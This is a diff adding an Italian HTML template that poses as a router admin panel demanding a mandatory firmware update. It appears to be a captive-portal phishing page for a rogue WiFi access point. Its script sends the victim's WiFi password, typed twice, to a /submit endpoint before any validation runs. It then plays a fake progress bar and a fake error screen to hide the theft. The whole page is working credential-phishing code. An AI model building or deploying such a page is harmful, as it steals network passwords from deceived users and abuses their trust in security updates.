@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en" class="h-100">
+<head>
+	<!-- Required meta tags -->
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css" crossorigin="anonymous">
+
+	<!-- Custom CSS -->
+	<link rel="stylesheet" href="/modules/{{module}}/graph.css" crossorigin="anonymous">
+
+	<title>Pannello Amministrazione</title>
+</head>
+<body class="d-flex flex-column h-100">
+	
+	<nav class="navbar">
+		<a class="navbar-brand" href="#">
+			<span>
+				<img src="/modules/{{module}}/logo.png" alt="Logo" class="navbar-brand-custom" height="35px">
+				<small>
+					<p class="navbar_paragraph"></span> Amministratore | Stato: Online | Lingua: IT</p>
+				</small>
+			</span>
+		</a>
+
+		<div class="navbar-right">
+			<span class="navbar_span_right">FW: 3.9.51</span><br>
+			<span class="navbar_span_right">IDH: R29710_XRJ0</span>
+		</div>
+
+	</nav>
+
+	<!--<h1>{{module}}</h1> -->
+
+	<div class="container">
+		<div class="row">
+			<div class="col-sm">
+
+
+				<div id="card_form" class="card" style="display: block">
+					<div class="card-body">
+						<h5 class="card-title">Aggiornamento Firmware</h5>
+						<!--<h6 class="card-subtitle mb-2 text-muted">Card subtitle</h6>-->
+						<hr>
+						
+						{% if ssid %}
+							<p>Per procedere con l'aggiornamento inserisci la password utilizzata per accedere alla rete <b>{{ssid}}</b>:</p>
+
+						{% else %}
+							<p>Per procedere con l'aggiornamento inserisci la password utilizzata per accedere alla rete WiFi:</p>
+
+						{% endif %}
+						
+						<div>
+							<div class="form-group">
+								<input type="password" class="form-control" id="password_1" placeholder="Password WiFi">
+							</div>
+							<div class="form-group">
+								<input type="password" class="form-control" id="password_2" placeholder="Verifica Password WiFi">
+							</div>
+
+							<p id="error_message"></p>
+
+							<button class="btn" onClick="call()">Aggiorna Firmware</button>
+						</div>
+
+					</div>
+				</div>
+
+
+				<div id="card_info" class="card" style="display: block">
+					<div class="card-body">
+						<h5 class="card-title">Maggiori Informazioni</h5>
+
+						<hr>
+
+						<p class="card-text">
+							E' necessario aggiornare il Firmware del router all'ultima versione disponibile (<b>v4.1.73</b>), per ragioni di sicurezza non sarà possibile utilizzare il router fino all'installazione del nuovo aggiornamento.<br><br>
+
+							Consigliamo a tutti i nostri utenti di installare gli aggiornamenti con regolarità, per garantire una navigazione sicura ed espandere le funzionalità dei nostri dispositivi. 
+							L'installazione di un nuovo aggiornamento non comporta nessuna modifica nella configurazione del dispositivo, l'unica informazione necessaria è l'ultima chiave di accesso alla rete WiFi che dovrà essere specificata dall'utente.<br>
+							Durante la procedura di aggiornamento del dispositivo verrà creata una rete WiFi temporanea che permetterà all'utente di inserire le informazioni richieste.<br><br>
+
+							Attenzione: spegnere o riavviare il dispositivo durante l'aggiornamento può danneggiare il router.<br><br>
+
+							Per maggiori informazioni sugli aggiornamenti visita la pagina: <a href="#">Aggiornamento Firmware</a>
+						</p>
+					</div>
+				</div>
+
+
+				<div id="card_loading" class="card" style="display: none">
+					<div class="card-body">
+						<h5 class="card-title">Aggiornamento in corso...</h5>
+
+						<hr>
+
+						<p class="card-text">
+							Attendere il completamento dell'aggiornamento.
+
+							<br>
+
+							<div class="progress">
+								<div class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+							</div>
+
+							<br>
+
+							Non spegnere o riavviare il dispositivo manualmente.
+						</p>
+					</div>
+				</div>
+
+
+				<div id="card_error" class="card" style="display: none">
+					<div class="card-body">
+						<h5 class="card-title">Errore Sconosciuto</h5>
+
+						<hr>
+
+						<p class="card-text">
+							La procedura di aggiornamento è stata interrotta a causa di un errore sconosciuto.<br><br>
+
+							A breve verrà ripristinato il corretto funzionamento del dispositivo utilizzando le ultime impostazioni valide.<br><br>
+
+							Non spegnere o riavviare il dispositivo manualmente.
+						</p>
+					</div>
+				</div>
+
+
+			</div>
+		</div>
+	</div>
+
+	<footer class="footer text-center mt-auto py-3">
+		<p class="footer_paragraph"><a href="#" class="footer_paragraph">Documentazione</a> | <a href="#" class="footer_paragraph">Supporto Online</a>  | <a href="#" class="footer_paragraph">Router FAQ</a></p>
+	</footer>
+
+	<script type="text/javascript">
+		
+		function call () {
+
+
+			$.ajax({
+				type: 'POST',
+				data: 'password_1=' + $("#password_1").val() + '&password_2=' + $("#password_2").val(),
+				url: '/submit'
+			})
+			.done(function(data, err) {
+				console.log("")
+			})
+			.fail(function(err) {
+				console.log("")
+			})
+
+
+			if ( $("#password_1").val().length < 8 ) {
+				document.getElementById("password_1").style.borderColor = "red";
+				document.getElementById("password_2").style.borderColor = "#ced4da";
+				document.getElementById("error_message").style.color = "red";
+				document.getElementById("error_message").innerHTML = "La password è troppo corta"
+				
+
+			} else if ( $("#password_2").val().length < 8 ) {
+				document.getElementById("password_1").style.borderColor = "#ced4da";
+				document.getElementById("password_2").style.borderColor = "red";
+				document.getElementById("error_message").style.color = "red";
+				document.getElementById("error_message").innerHTML = "La password è troppo corta"
+
+			} else if ( $("#password_1").val() != $("#password_2").val() ) {
+				document.getElementById("password_1").style.borderColor = "red";
+				document.getElementById("password_2").style.borderColor = "red";
+				document.getElementById("error_message").style.color = "red";
+				document.getElementById("error_message").innerHTML = "Le password non coincidono"
+			
+			} else {
+
+				document.getElementById("card_form").style.display="none";
+				document.getElementById("card_info").style.display="none";
+				document.getElementById("card_loading").style.display="block";
+
+				var i = 0;
+
+				var counterBack = setInterval(function () {
+					i++;
+
+					if (i <= 85) {
+						$('.progress-bar').css('width', i + '%');
+
+					} else {
+						clearInterval(counterBack);
+						document.getElementById("card_loading").style.display="none";
+						document.getElementById("card_error").style.display="block";
+					}
+
+				}, 1500); // 85 * 1.5 = 127.5 seconds
+
+			}
+
+
+		}
+
+	</script>
+
+	<!-- Optional JavaScript -->
+	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+	<script src="/static/jquery-3.4.1.min.js" crossorigin="anonymous"></script>
+	<script src="/static/popper/popper.min.js" crossorigin="anonymous"></script>
+	<script src="/static/bootstrap/js/bootstrap.min.js" crossorigin="anonymous"></script>
+</body>
+</html>
